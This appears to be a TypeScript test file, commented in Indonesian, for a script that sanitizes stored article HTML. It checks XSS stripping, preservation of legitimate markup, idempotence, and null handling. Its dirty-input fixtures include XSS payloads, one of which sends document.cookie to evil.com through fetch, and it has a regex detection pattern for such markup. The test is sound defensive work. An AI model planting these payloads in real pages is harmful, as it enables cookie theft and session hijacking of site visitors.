/**
 * Uji bagian murni dari src/scripts/backfill-sanitize-articles.ts.
 *
 * Tidak menyentuh database sama sekali -- yang diuji adalah computeChanges(),
 * fungsi yang menentukan baris mana yang berubah dan jadi seperti apa.
 *
 * Script-nya sendiri tinggal di src/scripts/ (bukan scripts/) supaya ikut
 * ter-compile ke dist/ dan bisa dijalankan di container produksi tanpa
 * mem-mount src/ -- lihat catatan lengkap di header file tersebut.
 * Test ini sengaja TETAP di scripts/ supaya tidak ikut ter-compile ke dist/
 * (kode test tidak perlu ikut terkirim ke image produksi).
 *
 * JALANKAN:
 *   npx tsx scripts/backfill-sanitize-articles.test.ts
 */

import { computeChanges, type ArticleRow } from "../src/scripts/backfill-sanitize-articles.js";

let pass = 0;
let fail = 0;

function check(name: string, cond: boolean, detail?: string) {
  if (cond) { pass++; console.log(`  PASS  ${name}`); }
  else      { fail++; console.log(`  FAIL  ${name}${detail ? "\n        " + detail : ""}`); }
}

function row(over: Partial<ArticleRow>): ArticleRow {
  return { id: "id", slug: "slug", title: "Judul", excerpt: null, content: "", ...over };
}

console.log("\n1. Artikel bersih TIDAK boleh ikut berubah");
{
  const clean: ArticleRow[] = [
    row({ id: "a1", slug: "tips-aman", title: "Tips Aman Bertransaksi",
          excerpt: "Panduan singkat", content: "<p>Halo <strong>dunia</strong></p>" }),
    row({ id: "a2", slug: "struktur", title: "Struktur",
          content: "<h2>Bab</h2><ul><li>satu</li><li>dua</li></ul><blockquote>kutipan</blockquote>" }),
    row({ id: "a3", slug: "link", title: "Link",
          content: '<p><a href="https://kawaltransaksi.com" rel="noopener noreferrer">tautan</a></p>' }),
    row({ id: "a4", slug: "kode", title: "Kode",
          content: "<pre><code>const x = 1 &lt; 2;</code></pre>" }),
  ];
  const ch = computeChanges(clean);
  check("0 artikel bersih yang berubah", ch.length === 0,
        `malah berubah: ${ch.map(c => c.slug + ":" + c.fields.join("/")).join(", ")}`);
}

console.log("\n2. Payload berbahaya HARUS dibersihkan & ditandai");
{
  const dirty: ArticleRow[] = [
    row({ id: "b1", slug: "xss-script", title: "Artikel",
          content: '<p>ok</p><script>fetch("https://evil.com?c="+document.cookie)</script>' }),
    row({ id: "b2", slug: "xss-onerror", title: "Artikel",
          content: '<img src=x onerror="alert(document.domain)">' }),
    row({ id: "b3", slug: "xss-jsurl",  title: "Artikel",
          content: '<a href="javascript:alert(1)">klik saya</a>' }),
    row({ id: "b4", slug: "xss-iframe", title: "Artikel",
          content: '<iframe src="https://evil.com/phish"></iframe>' }),
    row({ id: "b5", slug: "xss-title",  title: 'Judul<script>alert(1)</script>',
          content: "<p>aman</p>" }),
  ];
  const ch = computeChanges(dirty);
  check("kelima artikel terdeteksi berubah", ch.length === 5, `dapat ${ch.length}`);
  check("semuanya ditandai berbahaya", ch.every(c => c.dangerous.length > 0),
        JSON.stringify(ch.map(c => [c.slug, c.dangerous])));

  for (const c of ch) {
    const bad = /<\s*script|<\s*iframe|\son[a-z]+\s*=|javascript\s*:/i.test(
      `${c.next.title} ${c.next.content}`
    );
    check(`hasil bersih: ${c.slug}`, !bad, `masih: ${c.next.content} | ${c.next.title}`);
  }
  const t = ch.find(c => c.slug === "xss-title");
  check("judul jadi teks polos", t?.next.title === "Judul", `dapat: ${JSON.stringify(t?.next.title)}`);
}

console.log("\n3. Konten sah TIDAK boleh rusak");
{
  const rich = row({ id: "c1", slug: "kaya", title: "Panduan Lengkap",
    content:
      "<h2>Bagian 1</h2>" +
      "<p>Teks dengan <strong>tebal</strong>, <em>miring</em>, dan <s>coret</s>.</p>" +
      "<ul><li>poin satu</li><li>poin dua</li></ul>" +
      "<ol><li>langkah</li></ol>" +
      "<blockquote>Kutipan penting</blockquote>" +
      "<pre><code>kode();</code></pre>" +
      '<p><a href="https://ok.com" rel="noopener noreferrer">tautan</a></p>' +
      '<img src="https://img.kawaltransaksi.com/articles/x.jpg" alt="gambar" />' +
      "<hr />",
  });
  const ch = computeChanges([rich]);
  check("konten kaya tidak berubah sama sekali", ch.length === 0,
        ch.length ? `SESUDAH: ${ch[0].after}` : "");
}

console.log("\n4. IDEMPOTEN -- jalan kedua harus 0 perubahan");
{
  const start: ArticleRow[] = [
    row({ id: "d1", slug: "s1", title: "T<script>x</script>",
          excerpt: "<b>ringkas</b>", content: '<p>a</p><script>b</script><img src=x onerror=c>' }),
    row({ id: "d2", slug: "s2", title: "Biasa", content: "<p>biasa saja</p>" }),
  ];
  const first = computeChanges(start);
  check("jalan pertama menemukan perubahan", first.length === 1, `dapat ${first.length}`);

  // Terapkan hasilnya, lalu hitung ulang -- meniru menjalankan script 2x.
  const applied: ArticleRow[] = start.map(r => {
    const c = first.find(x => x.id === r.id);
    return c ? { ...r, title: c.next.title, excerpt: c.next.excerpt, content: c.next.content } : r;
  });
  const second = computeChanges(applied);
  check("jalan kedua 0 perubahan (idempoten)", second.length === 0,
        second.length ? JSON.stringify(second.map(c => [c.slug, c.fields])) : "");
}

console.log("\n5. excerpt null tetap null (tidak jadi string kosong)");
{
  const ch = computeChanges([row({ id: "e1", slug: "e", title: "T", excerpt: null, content: "<p>x</p>" })]);
  check("baris dengan excerpt null tidak berubah", ch.length === 0,
        ch.length ? JSON.stringify(ch[0].next) : "");
}

console.log(`\n${"=".repeat(50)}`);
console.log(`HASIL: ${pass} pass, ${fail} fail`);
console.log("=".repeat(50));
process.exit(fail > 0 ? 1 : 0);
